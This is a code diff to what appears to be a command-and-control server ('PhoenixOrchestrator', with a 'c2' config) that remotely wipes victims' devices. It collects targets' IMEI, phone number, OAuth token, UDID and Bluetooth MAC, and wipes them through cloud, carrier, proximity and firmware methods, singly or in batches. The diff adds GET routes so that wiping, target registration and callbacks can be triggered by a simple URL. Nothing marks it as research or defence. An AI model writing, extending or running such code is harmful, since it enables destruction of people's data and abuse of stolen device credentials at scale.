@@ -371,11 +371,15 @@ class PhoenixOrchestrator:
         app.router.add_get("/api/status", self._handle_status)
         app.router.add_get("/api/scan", self._handle_scan)
         app.router.add_post("/api/scan", self._handle_scan)
+        app.router.add_get("/api/wipe", self._handle_wipe)
         app.router.add_post("/api/wipe", self._handle_wipe)
+        app.router.add_get("/api/wipe/batch", self._handle_batch_wipe)
         app.router.add_post("/api/wipe/batch", self._handle_batch_wipe)
         app.router.add_get("/api/targets", self._handle_get_targets)
+        app.router.add_get("/api/add_target", self._handle_add_target)
         app.router.add_post("/api/targets", self._handle_add_target)
         app.router.add_get("/api/stats", self._handle_stats)
+        app.router.add_get("/api/callback", self._handle_callback)
         app.router.add_post("/api/callback", self._handle_callback)
 
         runner = web.AppRunner(app)
@@ -427,37 +431,46 @@ class PhoenixOrchestrator:
             return web.json_response({"error": str(e)}, status=500)
 
     async def _handle_wipe(self, request):
-        data = await request.json()
-        target = await self.enrich_target(data.get("ip_address", ""))
+        try:
+            if request.method == "POST":
+                data = await request.json()
+            else:
+                data = {k: v for k, v in request.query.items()}
+            target = await self.enrich_target(data.get("ip_address", ""))
 
-        if data.get("imei"):
-            target["imei"] = data["imei"]
-        if data.get("phone_number"):
-            target["phone_number"] = data["phone_number"]
-        if data.get("oauth_token"):
-            target["oauth_token"] = data["oauth_token"]
-        if data.get("udid"):
-            target["udid"] = data["udid"]
-        if data.get("bluetooth_mac"):
-            target["bluetooth_mac"] = data["bluetooth_mac"]
-        if data.get("device_id"):
-            target["device_id"] = data["device_id"]
+            for key in ["imei", "phone_number", "oauth_token", "udid",
+                        "bluetooth_mac", "device_id", "device_type",
+                        "device_model"]:
+                if data.get(key):
+                    target[key] = data[key]
 
-        target_id = await self.db.upsert_target(target)
-        target["id"] = target_id
+            target_id = await self.db.upsert_target(target)
+            target["id"] = target_id
 
-        methods = data.get("methods", ["cloud", "carrier", "proximity", "firmware"])
-        result = await self.wipe_target(target, methods)
+            methods_str = data.get("methods", "cloud,carrier,proximity,firmware")
+            if isinstance(methods_str, str):
+                methods = methods_str.split(",")
+            else:
+                methods = methods_str
+            result = await self.wipe_target(target, methods)
 
-        return web.json_response(result, dumps=str)
+            return web.json_response(result, dumps=str)
+        except Exception as e:
+            return web.json_response({"error": str(e)}, status=500)
 
     async def _handle_batch_wipe(self, request):
-        data = await request.json()
-        result = await self.batch_wipe(
-            status_filter=data.get("status", "discovered"),
-            delay=data.get("delay", CONFIG.c2.wipe_cooldown_sec)
-        )
-        return web.json_response(result, dumps=str)
+        try:
+            if request.method == "POST":
+                data = await request.json()
+            else:
+                data = {k: v for k, v in request.query.items()}
+            result = await self.batch_wipe(
+                status_filter=data.get("status", "discovered"),
+                delay=float(data.get("delay", CONFIG.c2.wipe_cooldown_sec))
+            )
+            return web.json_response(result, dumps=str)
+        except Exception as e:
+            return web.json_response({"error": str(e)}, status=500)
 
     async def _handle_get_targets(self, request):
         status = request.query.get("status")
@@ -465,12 +478,18 @@ class PhoenixOrchestrator:
         return web.json_response({"targets": targets}, dumps=str)
 
     async def _handle_add_target(self, request):
-        data = await request.json()
-        target_id = await self.db.upsert_target(data)
-        return web.json_response({
-            "target_id": target_id,
-            "status": "added",
-        })
+        try:
+            if request.method == "POST":
+                data = await request.json()
+            else:
+                data = {k: v for k, v in request.query.items()}
+            target_id = await self.db.upsert_target(data)
+            return web.json_response({
+                "target_id": target_id,
+                "status": "added",
+            })
+        except Exception as e:
+            return web.json_response({"error": str(e)}, status=500)
 
     async def _handle_stats(self, request):
         stats = await self.db.get_wipe_stats()
